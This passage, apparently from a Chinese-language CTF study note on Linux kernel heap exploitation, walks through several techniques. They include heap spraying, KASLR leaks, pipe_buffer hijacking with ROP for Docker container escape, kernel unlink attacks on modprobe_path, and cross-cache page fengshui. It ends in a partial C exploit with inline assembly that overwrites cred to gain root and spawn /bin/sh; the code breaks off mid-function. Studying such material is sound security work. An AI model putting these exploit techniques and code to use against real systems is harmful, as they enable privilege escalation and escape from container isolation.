+<p>注意：堆喷时，user_key_payload 的第一个 QWORD 必须为 NULL（poll 的遍历只在 next 为 NULL 时终止）。可以通过 setxattr 函数进行布置：具体来说，kmalloc 分配的 chunk 不一定为 NULL，但 chunk 的分配和释放遵循后进先出原则，因此可以先用 setxattr 函数（分配后立即释放 chunk）将 chunk 清零，再将该 chunk 分配给 user_key_payload 结构体。</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="堆喷-seq_operations-结构体与-keyctl_read">堆喷 seq_operations 结构体与 keyctl_read</h3>
+<ul>
+<li>随后堆喷 kmalloc-32 的 seq_operations 结构体，使之前释放的 kmalloc-32 user_key_payload 结构体与 seq_operations 结构体重叠。</li>
+</ul>
+<pre><code class="language-c">struct user_key_payload {
+	struct rcu_head	rcu;		/* RCU destructor */
+	unsigned short	datalen;	/* length of this data */
+	char		data[] __aligned(__alignof__(u64)); /* actual data */
+};
+</code></pre>
+<pre><code class="language-c">struct seq_operations {
+    void * (*start) (struct seq_file *m, loff_t *pos);
+    void (*stop) (struct seq_file *m, void *v);
+    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+    int (*show) (struct seq_file *m, void *v);
+};
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-018-01dd596636.png" alt="图片"></p>
+<ul>
+<li>此时 data 字段恰好存放 show 函数地址，通过 keyctl_read 泄露基址。</li>
+</ul>
+<h3 id="堆喷-ptmx">堆喷 ptmx</h3>
+<ul>
+<li>打开 ptmx 时，会分配一个 kmalloc-1024 的 tty_struct 和一个 kmalloc-32 的 tty_file_private，其中 tty_file_private-&gt;tty 指向对应 tty_struct 结构体的地址。大量喷射 ptmx，使某个 kmalloc-32 的 tty_file_private 落在已发生 UAF 的 kmalloc-32 user_key_payload 的 data 之后的较高地址处。</li>
+<li>利用 user_key_payload 的 data 越界读取（data 是对象内某个偏移处的地址），可以泄露某个 kmalloc-32 tty_file_private 的内容，其中包含 kmalloc-1024 tty_struct 的地址。</li>
+</ul>
+<h3 id="释放-seq再堆喷-poll_list-和-user_key释放后通过-setxattr-堆喷-user_key-修改-">释放 seq，再堆喷 poll_list 和 user_key；释放后，通过 setxattr + 堆喷 user_key 修改 UAF chunk</h3>
+<ul>
+<li>对 seq_operations 使用 close()，释放由 seq_operations 和 user_key_payload 共同占用的 kmalloc-32 chunk。</li>
+<li>然后堆喷 poll_list 对象占据 kmalloc-32；此时 UAF chunk 由 user_key_payload 和 poll_list 共同占用。</li>
+<li>释放 user_key_payload 对象，再结合 setxattr 函数与 kmalloc-32 user_key_payload 堆喷：分配到 UAF chunk 的那个 chunk，其第一个 QWORD 会被改为泄露的堆地址 - 0x18（即调用一次 setxattr，再喷一个，如此循环；偏移为 0x18 时，对应的前八字节为 NULL，因此不会继续遍历）。修改后，UAF chunk 由 user_key_payload 和 poll_list 共同占用。</li>
+</ul>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-019-ff5a67a0d0.png" alt="图片"></p>
+<h3 id="释放-tty_struct堆喷-pipe_buffer-和-poll_list释放后再堆喷-user_key_paylo">释放 tty_struct，堆喷 pipe_buffer 和 poll_list，释放后再堆喷 user_key_payload 劫持 pipe_buffer</h3>
+<ul>
+<li>在 poll_list 尚未释放时，释放 tty_struct（泄露的 kmalloc-1024 对象地址属于 tty_struct），并堆喷分配 pipe_buffer，用 pipe_buffer 替换 target_object。</li>
+<li>之后，释放 poll_list 会导致 target_object - 0x18 区域被释放。（可能需要释放全部 user_key_payload，因为 add_key 可分配的 key 数量存在上限，超过后分配会失败。）再堆喷 kmalloc-1024 大小的 user_key_payload，劫持 target_object - 0x18，从而劫持 pipe_buffer 并布置 ROP 链。</li>
+</ul>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-020-134ce4fd63.png" alt="图片"></p>
+<h3 id="rop">rop</h3>
+<ol>
+<li><p>Docker 的安全限制：
+Docker 通过 seccomp 禁用 setns() 系统调用，这种安全机制会阻止容器内进程切换到其他命名空间。</p>
+</li>
+<li><p>分析 setns() 源码：
+可以发现，setns() 实际调用 commit_nsset() 执行命名空间切换。</p>
+</li>
+<li><p>模仿 setns() 的行为：</p>
+<ul>
+<li>使用 copy_fs_struct() 克隆 init_fs 结构体。init_fs 是初始（根）文件系统结构体，克隆它就能获得对整个系统文件系统的访问。</li>
+<li>使用 find_task_by_vpid() 找到当前任务的结构体。</li>
+<li>使用内核中的任意写原语（通过 ROP gadget），将新的 fs_struct 安装到当前任务中。（task_struct 的 fs 指向 init_fs。）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>使用 find_task_by_vpid() 定位 Docker 容器任务，再用 switch_task_namespaces() 将其 nsproxy 结构体改为 init_nsproxy。但仅凭这一点还不足以逃逸容器。</p>
+</blockquote>
+<p>仅修改 nsproxy 结构体不足以完全逃逸容器的原因：</p>
+<ol>
+<li><p>部分逃逸：
+使用 switch_task_namespaces() 将容器任务的 nsproxy 结构体改为 init_nsproxy，确实是逃逸过程的一部分。这一步让容器进程在某些方面（如网络、PID 等）看到宿主系统的视图。</p>
+</li>
+<li><p>逃逸不完整：
+不过，这项修改只影响部分命名空间，并未影响所有隔离机制。尤其是文件系统隔离仍然存在。</p>
+</li>
+<li><p>seccomp 限制：
+Docker 使用 seccomp 过滤器限制容器内可用的系统调用。setns() 被拦截意味着，即使修改了 nsproxy 结构体，进程也无法通过正常系统调用完全切换到新的命名空间。</p>
+</li>
+<li><p>文件系统隔离：
+容器的文件系统视图仍然隔离。要完全逃逸，还必须改变进程的文件系统视图，使其能够访问宿主机的完整文件系统。</p>
+</li>
+</ol>
+<blockquote>
+<p>Docker 容器与 Google 的 kCTF 不同，默认通过 seccomp 拦截 setns()，因此返回用户空间后，无法使用它进入其他命名空间。需要找到替代方法，而且必须在 ROP 链中实现。
+阅读 setns() 源码可知，它通过调用 commit_nsset()，实际将任务移入不同的命名空间。可以照着它的做法，使用 copy_fs_struct() 克隆 init_fs 结构体，再用 find_task_by_vpid() 定位当前任务，并使用 gadget 手动安装新的 fs_struct。</p>
+</blockquote>
+<h1 id="任意地址释放仅限堆地址">任意地址释放（仅限堆地址）</h1>
+<p>内核利用中，有时希望将结构体 A 中的某个指针修改为指向结构体 B，再释放结构体 A，从而释放结构体 B，造成结构体 B 的 UAF（例如 pollfd 的 next 指针：所有对象都通过 next 依次释放，因此可以将 next 改为指向目标结构体）。</p>
+<ul>
+<li>连续释放会将结构体 A 内部指针所指向的结构体 B 对象释放，但结构体 B 仍然可以使用。</li>
+<li>分配结构体 C，回收结构体 B 释放的对象；此时就可以通过结构体 C 修改结构体 B。</li>
+</ul>
+<blockquote>
+<p>不过，有时与结构体 B 重叠的结构体 C 无法触及结构体 B 的关键字段。这时可以考虑将 A 的指针改为 B 的地址减去某个偏移，使结构体 C 的可控部分覆盖到结构体 B 中需要修改的区域。</p>
+</blockquote>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-021-dbd899f341.png" alt="图片">
+分析 kfree 源码可知，会通过对象所在的 page 获取 kmem_cache。</p>
+<pre><code class="language-c">void kfree(const void *x)
+{
+	struct page *page;
+	void *object = (void *)x;
+
+	trace_kfree(_RET_IP_, x);
+
+	if (unlikely(ZERO_OR_NULL_PTR(x)))
+		return;
+
+	page = virt_to_head_page(x);
+	if (unlikely(!PageSlab(page))) {
+		BUG_ON(!PageCompound(page));
+		kfree_hook(object);
+		__free_pages(page, compound_order(page));
+		return;
+	}
+	slab_free(page-&gt;slab_cache, page, object, NULL, 1, _RET_IP_);
+}
+</code></pre>
+<p>之后是如下调用链：</p>
+<pre><code class="language-bash">kfree()
+    slab_free()
+        do_slab_free()
+</code></pre>
+<p>do_slab_free 中几乎不做检查，直接将对象链接到 freelist。因此可以实现堆上的任意地址释放。</p>
+<pre><code class="language-c">
+
+	if (likely(page == c-&gt;page)) {
+		set_freepointer(s, tail_obj, c-&gt;freelist);
+
+		if (unlikely(!this_cpu_cmpxchg_double(
+				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,
+				c-&gt;freelist, tid,
+				head, next_tid(tid)))) {
+
+			note_cmpxchg_failure(&quot;slab_free&quot;, s, tid);
+			goto redo;
+		}
+		stat(s, FREE_FASTPATH);
+	}
+</code></pre>
+<h1 id="内核-unlink">内核 Unlink</h1>
+<p>从链表中移除元素时需要执行 unlink。内核 unlink 的主要目的是利用 unlink 相互写入指针的操作，实现任意地址写。</p>
+<p>unlink 基于 list_del 操作。伪造两个地址，替换 list_head 中的 prev 和 next，使一个地址写入另一个地址指向的内存。如果能控制 prev / next 指针，就可以将 prev 设为 modprobe_path，使 [2] 处将 next 的值写入 prev 指向的内存。</p>
+<p>问题在于：[1] 处会先将 prev 写入 next-&gt;prev，这意味着 next 也必须是有效指针；之后还需要将 next 写入 prev-&gt;next，因此限制了能向 prev 写入的值。解决方法是使用 physmap 提供有效的 prev 值。</p>
+<pre><code class="language-c">
+static inline void __list_del(struct list_head * prev, struct list_head * next)
+{
+	next-&gt;prev = prev; 				// [1]
+	WRITE_ONCE(prev-&gt;next, next); 	// [2]
+}
+</code></pre>
+<p>physmap 的范围：0xffff888000000000-0xffffc87fffffffff</p>
+<p>physmap 是内核虚拟内存中的一片区域，物理内存页连续映射到这里。因此，被劫持的 prev 地址可处于 0xffff888000000000 到 0xffffc87fffffffff 之间（存在偏移，可能的值取决于实际偏移）。攻击者可以控制 prev 的低 4 字节，只需保证高 4 字节表示 physmap 地址。</p>
+<p>由于目标是修改 modprobe_path，可以构造 next = 0xffffxxxx2f706d74（系统内存至少需要 0x2f706d7c 字节，约 760M）。如果 prev = modprobe_path + 1，那么通过 [2]，modprobe_path 会被覆盖为 /tmp/(0xffffxxxx 对应的字符)probe（其中 0xffffxxxx 为 prev 的高 4 字节）。随后就能像前面一样提权。</p>
+<pre><code class="language-bash">例如
+0xffff c87e 2f706d74
+ÿÿ È~ /pmt
+</code></pre>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-022-6306d4e2dc.png" alt="图片"></p>
+<h2 id="simple_xattr任何有链表-unlink-操作的结构体都可以">simple_xattr（任何有链表 unlink 操作的结构体都可以）</h2>
+<ol>
+<li>setxattr</li>
+</ol>
+<p>setxattr 是用于设置文件扩展属性的系统调用，基本语法如下：</p>
+<pre><code class="language-c">int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+</code></pre>
+<ul>
+<li>path：文件路径</li>
+<li>name：属性名</li>
+<li>value：属性值</li>
+<li>size：属性值大小</li>
+<li>flags：设置标志</li>
+</ul>
+<p>例如：</p>
+<pre><code class="language-c">setxattr(&quot;/path/to/file&quot;, &quot;user.myattr&quot;, &quot;myvalue&quot;, 7, 0);
+</code></pre>
+<p>这会为文件设置一个名为 &quot;user.myattr&quot;、值为 &quot;myvalue&quot; 的扩展属性。</p>
+<ol start="2">
+<li>simple_xattr</li>
+</ol>
+<p>simple_xattr 是 Linux 内核中用于管理扩展属性的结构体。用户空间程序通常不会直接使用它，而是由内核用它存储和管理扩展属性。</p>
+<p>其结构大致如下：</p>
+<pre><code class="language-c">struct simple_xattr {
+    struct list_head list;  // 用于链接多个xattr
+    char *name;             // xattr的名称
+    size_t size;            // xattr值的大小
+    char value[];           // xattr的值,柔性数组成员
+};
+
+struct list_head {
+	struct list_head *next, *prev;
+};
+</code></pre>
+<ul>
+<li>list：用于将多个 xattr 链接在一起</li>
+<li>name：属性名</li>
+<li>size：属性值大小</li>
+<li>value：属性值（柔性数组成员）</li>
+</ul>
+<p>每个文件的 simple_xattr 保存在 list_head 链表中。分配函数为 simple_xattr_alloc()，用户控制 simple_xattr-&gt;value，分配大小从 kmalloc-32 到很大都可以。</p>
+<blockquote>
+<p>simple_xattr 不能原地修改；编辑时，会先将旧 simple_xattr 从链表中 unlink，再分配新的 simple_xattr 并链接进去。这里可以通过 UAF 或溢出修改 simple_xattr。另外，非特权用户不能设置 simple_xattr，但只要系统支持用户命名空间就可以。</p>
+</blockquote>
+<p>因此可以通过修改 simple_xattr 进行 unlink 攻击。但这种技巧需要知道哪个 simple_xattr 对象被覆盖；否则，随意移除一个 simple_xattr，会在遍历链表时出错（如果被移除的正常 simple_xattr 与异常 simple_xattr 相邻，就会将异常 simple_xattr 链接到双向链表中）。</p>
+<p>假设某个文件系统中有一个 &quot;secret.txt&quot; 文件，它具有以下 xattr：</p>
+<ol>
+<li>user.color = &quot;red&quot;</li>
+<li>user.size = &quot;large&quot;</li>
+<li>user.type = &quot;confidential&quot;</li>
+</ol>
+<p>这些 xattr 可能以 simple_xattr 对象链表的形式保存在内核中。</p>
+<p>现在，攻击者想利用 simple_xattr 漏洞，目标是覆盖 &quot;user.size&quot; 的 simple_xattr 对象。</p>
+<p>步骤：</p>
+<ol>
+<li><p>攻击者首先需要触发堆溢出或 UAF 漏洞，以便覆盖 &quot;user.size&quot; 的 simple_xattr 对象。</p>
+</li>
+<li><p>攻击者修改 &quot;user.size&quot; 的 simple_xattr 对象中的 list_head。</p>
+</li>
+<li><p>现在，攻击者希望利用这个已修改的对象继续攻击。</p>
+</li>
+<li><p>如果攻击者随机移除一个 xattr，例如 &quot;user.color&quot;：</p>
+<pre><code>removexattr(&quot;secret.txt&quot;, &quot;user.color&quot;)
+</code></pre>
+<p>由于链表结构已被破坏，这可能导致内核遍历 xattr 链表时出错。</p>
+</li>
+<li><p>相应地，攻击者应准确定位并操作 &quot;user.size&quot; 这个 xattr：</p>
+<pre><code>removexattr(&quot;secret.txt&quot;, &quot;user.size&quot;)
+</code></pre>
+</li>
+</ol>
+<p>覆盖 simple_xattr 后，可以通过以下方式找到对应的 simple_xattr：</p>
+<ul>
+<li>如果修改 simple_xattr 的同时，还能读取其 value（通过 UAF 控制 simple_xattr），就可以在创建 simple_xattr 时设置 value（setxattr 的 value 参数），据此判断哪个 simple_xattr 对象被覆盖。</li>
+<li>每次分配长度为 0x100 字节的 name（setxattr 的 name 参数），这样 simple_xattr-&gt;name 指针的最低 1 字节为 0（通过溢出修改 simple_xattr）。此时，在覆盖 simple_xattr 的 list_head 时，同时覆盖 simple_xattr-&gt;name 的最低 1 字节，使 name 指向原 name 中间的某处，从而确定被覆盖的 simple_xattr 所对应的名称。</li>
+</ul>
+<p>下图总结了 simple_xattr-&gt;name 的构造方式。</p>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-023-2f0ed3ec82.png" alt="图片"></p>
+<p><img src="/workspace/endpoint-security/kernel-security/study-notes/CTF-PWN%20%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88UAF%E3%80%81heap_overflow%E3%80%81freelist%20%E5%8A%AB%E6%8C%81%E3%80%81offbyn/assets/csdn-141576311/image-024-db6794eaf6.png" alt="图片"></p>
+<h1 id="跨缓存溢出与页级堆风水">跨缓存溢出与页级堆风水</h1>
+<p><a href="https://blog.xmcve.com/2023/10/12/Kernel-Heap---Cross-Cache-Overflow/">https://blog.xmcve.com/2023/10/12/Kernel-Heap---Cross-Cache-Overflow/</a>
+<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/buddy/cross-cache/#stepii-page-level-heap-fengshui">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/buddy/cross-cache/#stepii-page-level-heap-fengshui</a></p>
+<h2 id="使用-setsocket-分配页面">使用 setsocket 分配页面</h2>
+<p>分配页面：创建一个协议为 PF_PACKET 的 socket 后，先调用 setsockopt()，将 PACKET_VERSION 设为 TPACKET_V1/TPACKET_V2；再调用 setsockopt() 申请 PACKET_TX_RING，创建环形缓冲区。调用链如下：</p>
+<pre><code class="language-bash">__sys_setsockopt()
+    sock-&gt;ops-&gt;setsockopt()
+        packet_setsockopt() // case PACKET_TX_RING ↓
+            packet_set_ring()
+                alloc_pg_vec()
+最终调用
+		 order = get_order(req-&gt;tp_block_size);
+        pg_vec = alloc_pg_vec(req, order);
+
+相关使用函数
+socket(PF_PACKET, SOCK_RAW, 768)        = 3
+...
+setsockopt(3, SOL_PACKET, PACKET_VERSION, [1], 4) = 0
+...
+setsockopt(3, SOL_PACKET, PACKET_RX_RING, {block_size=131072, block_nr=31, frame_size=65616, frame_nr=31}, 16) = 0
+</code></pre>
+<p>最后，alloc_pg_vec() 实际调用内核的内存分配函数。注意，这里是分配 block_nr 个由所给 order 决定大小的页面块，order 取决于 block_size。这里创建 pg_vec 数组，用于分配 tp_block_nr 个块，每块包含 2^order 个页面。由于最终使用单个页面作为 cache slab 进行布局，因此这里每次 setsockopt 只需要分配一个页面。</p>
+<pre><code class="language-c">struct pgv {
+    char *buffer;
+};
+
+static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
+{
+    ...
+
+    pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
+    if (unlikely(!pg_vec))
+        goto out;
+
+    for (i = 0; i &lt; block_nr; i++) {
+        pg_vec[i].buffer = alloc_one_pg_vec_page(order);
+    
+    ...
+}
+
+static char *alloc_one_pg_vec_page(unsigned long order)
+{
+    char *buffer;
+    gfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |
+              __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;
+
+    buffer = (char *) __get_free_pages(gfp_flags, order);
+    if (buffer)
+        return buffer;
+    
+    ...
+}
+</code></pre>
+<p>由于存在检查，还需要构造 tp_frame_size 和 tp_frame_nr。</p>
+<pre><code class="language-c">err = -EINVAL;
+        if (unlikely((int)req-&gt;tp_block_size &lt;= 0))
+            goto out;
+        if (unlikely(!PAGE_ALIGNED(req-&gt;tp_block_size)))
+            goto out;
+        min_frame_size = po-&gt;tp_hdrlen + po-&gt;tp_reserve;
+        if (po-&gt;tp_version &gt;= TPACKET_V3 &amp;&amp;
+            req-&gt;tp_block_size &lt;
+            BLK_PLUS_PRIV((u64)req_u-&gt;req3.tp_sizeof_priv) + min_frame_size)
+            goto out;
+        if (unlikely(req-&gt;tp_frame_size &lt; min_frame_size))
+            goto out;
+        if (unlikely(req-&gt;tp_frame_size &amp; (TPACKET_ALIGNMENT - 1)))
+            goto out;
+
+        rb-&gt;frames_per_block = req-&gt;tp_block_size / req-&gt;tp_frame_size;
+        if (unlikely(rb-&gt;frames_per_block == 0))
+            goto out;
+        if (unlikely(rb-&gt;frames_per_block &gt; UINT_MAX / req-&gt;tp_block_nr))
+            goto out;
+        if (unlikely((rb-&gt;frames_per_block * req-&gt;tp_block_nr) !=
+                    req-&gt;tp_frame_nr))
+            goto out;
+</code></pre>
+<p>最终分配页面的模板如下：</p>
+<pre><code class="language-c">   socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
+   version = TPACKET_V1;
+    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
+                     &amp;version, sizeof(version));
+      req.tp_block_size = size; //0x1000
+    req.tp_block_nr = nr; //1
+    req.tp_frame_size = 0x1000;
+    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
+
+    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));
+</code></pre>
+<p>init_module 创建了一个对象大小为 512 字节的 kmem_cache，创建时使用 SLAB_ACCOUNT | SLAB_PANIC 标志，且开启 CONFIG_MEMCG_KMEM=y，因此这是一个独立 kmem_cache。同一 slab 内无法利用，只能在页级进行利用。</p>
+<h2 id="使用-setsocket-进行命名空间逃逸">使用 setsocket 进行命名空间逃逸</h2>
+<p>不过，无法在根命名空间中使用这一原语，因此需要创建子进程，并通过 unshare 系统调用创建新的子命名空间，应用于该子进程。这样新创建的子进程就能使用页级分配原语，而新命名空间会应用于调用 unshare 的进程（即子进程）及其后代。</p>
+<h2 id="处理-fork-噪声与-clone-子进程标志">处理 fork 噪声与 clone 子进程标志</h2>
+<p>fork 的核心函数是 kernel_clone，clone 中的以下标志可以大幅减少 fork 时产生的噪声：</p>
+<pre><code class="language-bash">CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
+</code></pre>
+<p>设置这些标志后，产生的噪声减少为：</p>
+<pre><code class="language-bash">
+task_struct
+kmalloc-64
+vmap_area
+vmap_area
+cred_jar
+signal_cache
+pid
+</code></pre>
+<p>注意，这里仍有 vmalloc 产生的 4 个 order_0 页面。
+还有一个问题：子进程实际上不能写入任何进程内存，因为它与父进程共享同一虚拟内存。因此，必须使用仅依赖寄存器、不写内存的 shellcode，检查是否提权成功。</p>
+<h2 id="进程间管道通信">进程间管道通信</h2>
+<p>由于进程需要在另一个命名空间中执行 setsocket 操作，因此通过管道与主进程通信。</p>
+<p>至于 clone 出来的进程如何知道当前 cred 是否已提权，可以设置管道与主进程通信。主进程完成全部堆喷和溢出写入后，通过管道通知 clone 进程。因为 clone 进程从一开始就在读取管道，所以会阻塞，直到主进程向它发送数据。随后 clone 检查当前 uid，并执行 <code>execve(&quot;/bin/sh&quot;, args, 0)</code>。</p>
+<h2 id="利用-2">利用</h2>
+<p>ioctl 支持添加和编辑对象；编辑操作存在六字节溢出。</p>
+<ul>
+<li>首先分配大量单页，耗尽伙伴系统中的低阶页面，得到一段连续内存。</li>
+</ul>
+<pre><code class="language-c">  for (int i = 1; i &lt; PGV_PAGE_NUM; i ++) {
+        alloc_page(i);
+    }
+</code></pre>
+<ul>
+<li>喷射后，后续分配的页面通常是连续的。接着隔页释放（关闭对应 socket，每个页面对应一个 socket），再堆喷 cred（clone 进程），就有机会得到此前释放的单页。</li>
+</ul>
+<pre><code class="language-c">  for (int i = 1; i &lt; PGV_PAGE_NUM; i += 2) {
+        free_page(i);
+    }
+ for (int i = 0; i &lt; CRED_SPRAY_NUM; i++) {
+        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; 0) {
+			…………
+        }
+    }
+</code></pre>
+<ul>
+<li>释放之前间隔保留的页面，调用漏洞函数分配 chunk，就有机会得到这些释放的间隔页。此时它们可能恰好与 cred 所在页相邻。再利用模块中的漏洞进行越界写入，篡改 cred-&gt;uid，完成提权。</li>
+</ul>
+<pre><code class="language-c"> for (int i = 0; i &lt; PGV_PAGE_NUM; i += 2) {
+        free_page(i);
+    }
+    memset(buf, 0, sizeof(buf));
+    *(uint32_t *) &amp;buf[VUL_OBJ_SIZE - 6] = 1;    /* cred-&gt;usage */
+    for (int i = 0; i &lt; VUL_OBJ_NUM; i++) {
+        alloc();
+        edit(i, VUL_OBJ_SIZE, buf);
+    }
+</code></pre>
+<h3 id="注意事项">注意事项</h3>
+<p>管道参数需要为 <code>int*</code>，否则通信始终失败。</p>
+<p>另外注意：子进程检测到自己为 root 并启动 shell 后，主进程必须以 sleep(1000) 结束，否则 shell 会立即退出。</p>
+<h3 id="exp-5">exp</h3>
+<pre><code class="language-c">#define _GNU_SOURCE 
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;time.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;stdbool.h&gt;
+
+#define PACKET_VERSION 10
+#define PACKET_TX_RING 13
+#define CHUNK_SIZE 512
+#define ALLOC 0xcafebabe
+#define DELETE 0xdeadbabe
+#define EDIT 0xf00dbabe
+int pipe_parent_read[2];
+int pipe_child_read[2];
+
+size_t socket_fd[0x1000];
+struct request_dev{
+    size_t index;
+    size_t size;
+    size_t buf;
+};
+enum request_socket_page_cmd
+{
+    alloc_page,
+    free_page,
+    exit_page,
+};
+
+void bind_core(int core) {
+    cpu_set_t cpu_set;
+
+    CPU_ZERO(&amp;cpu_set);
+    CPU_SET(core, &amp;cpu_set);
+    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);
+}
+
+struct request
+{
+    enum request_socket_page_cmd cmd;
+    size_t idx;
+
+};
+
+struct tpacket_req{
+    unsigned int tp_block_size;
+    unsigned int tp_block_nr;
+    unsigned int tp_frame_size;
+    unsigned int tp_frame_nr;
+};
+enum tpacket_versions {
+    TPACKET_V1,
+    TPACKET_V2,
+    TPACKET_V3,
+};
+int alloc_pages_via_sock(uint32_t size, uint32_t n){
+    struct tpacket_req req;
+    int32_t socketfd, version;
+    
+    /* Create the AF_PACKET socket */
+    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
+    version = TPACKET_V1;
+    setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &amp;version, sizeof(version));
+    memset(&amp;req, 0, sizeof(req));
+    req.tp_block_size = size;
+    req.tp_block_nr = n;
+    req.tp_frame_size = 4096;
+    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr)/req.tp_frame_size;
+    setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));
+    return socketfd;
+}
+
+
+size_t socketfds[0x500];
+void socker_page_spray_prepare()
+{   puts(&quot;start fork&quot;);
+    if(!fork())
+    {   
+        uid_t uid=getuid();
+        gid_t gid=getpid();
+        int temp;
+        char edit[0x100];
+        unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);     //Create new namespace and get in
+        temp = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);
+        write(temp, &quot;deny&quot;, strlen(&quot;deny&quot;));
+        close(temp);
+        temp = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);
+        snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, uid);
+        write(temp, edit, strlen(edit));
+        close(temp);
+        temp = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);
+        snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, gid);
+        write(temp, edit, strlen(edit));
+        close(temp);
+        puts(&quot;create new namespace&quot;);
+        struct request req;
+        size_t result;
+        do{
+            read(pipe_child_read[0], &amp;req, sizeof(req));
+            if(req.cmd == alloc_page){
+                socketfds[req.idx] = alloc_pages_via_sock(4096, 1);
+            }else if (req.cmd == free_page){
+                close(socketfds[req.idx]);
+            }
+            result = req.idx;
+            write(pipe_parent_read[1], &amp;result, sizeof(result));
+        }while(req.cmd != exit_page);
+    }
+}
+
+int rootfd[2];
+char root[] = &quot;root\n&quot;;
+char throwaway[0x100];
+struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
+char binsh[] = &quot;/bin/sh\x00&quot;;
+char *args[] = {&quot;/bin/sh&quot;, NULL};
+__attribute__((naked)) void check_and_wait()
+{
+    asm(
+        &quot;lea rax, [rootfd];&quot;
+        &quot;mov edi, dword ptr [rax];&quot;
+        &quot;lea rsi, [throwaway];&quot;
+        &quot;mov rdx, 1;&quot;
+        &quot;xor rax, rax;&quot;
+        &quot;syscall;&quot;              //read(rootfd, throwaway, 1)
+        &quot;mov rax, 102;&quot;         
+        &quot;syscall;&quot;              //getuid()
+        &quot;cmp rax, 0;&quot;           // not root, goto finish
+        &quot;jne finish;&quot;
+        &quot;mov rdi, 1;&quot;
+        &quot;lea rsi, [root];&quot;
+        &quot;mov rdx, 5;&quot;
+        &quot;mov rax, 1;&quot;
+        &quot;syscall;&quot;              //write(1, root, 5)
+        &quot;lea rdi, [binsh];&quot;
+        &quot;lea rsi, [args];&quot;
+        &quot;xor rdx, rdx;&quot;
+        &quot;mov rax, 59;&quot;
+        &quot;syscall;&quot;              //execve(&quot;/bin/sh&quot;, args, 0)
+        &quot;finish:&quot;
+        &quot;lea rdi, [timer];&quot;
+        &quot;xor rsi, rsi;&quot;
+        &quot;mov rax, 35;&quot;
+        &quot;syscall;&quot;              //nanosleep()
+        &quot;ret;&quot;);
+}
+__attribute__((naked)) pid_t clone_and_getsh(uint64_t flags, void *dest)
+{
+     
+    asm(&quot;mov r15, rsi;&quot;
+        &quot;xor rsi, rsi;&quot;
+        &quot;xor rdx, rdx;&quot;
+        &quot;xor r10, r10;&quot;
+        &quot;xor r9, r9;&quot;
+        &quot;mov rax, 56;&quot;
+        &quot;syscall;&quot;
+        &quot;cmp rax, 0;&quot;
+        &quot;jl bad_end;&quot;
+        &quot;jg good_end;&quot;
+        &quot;jmp r15;&quot;
+        &quot;bad_end:&quot;
+        &quot;neg rax;&quot;
+        &quot;ret;&quot;
